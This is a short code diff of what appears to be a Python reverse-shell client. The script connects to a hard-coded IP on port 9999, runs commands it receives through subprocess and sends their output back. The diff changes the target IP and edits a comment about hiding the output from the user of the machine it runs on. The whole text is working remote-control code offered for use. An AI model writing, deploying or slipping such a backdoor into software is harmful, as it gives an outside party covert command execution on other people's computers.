@@ -3,7 +3,7 @@ import socket
 import subprocess
 
 s = socket.socket()
-host = "192.168.1.6" # enter the ip of the computer/server
+host = "192.168.1.185" # enter the ip of the computer/server
 port = 9999
 s.connect((host, port))
 
@@ -17,7 +17,7 @@ while True:
         output_bytes = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_bytes, "utf-8")
         s.send(str.encode(output_str + str(os.getcwd()) + '> '))
-        print(output_str) # optional, comment out if you want to hide the terminal from end-point client (server)
+        print(output_str) # optional, comment out to hide the output, this will output the results of commands to the terminal of the end-point client/user
 
 # Close connection
 s.close()
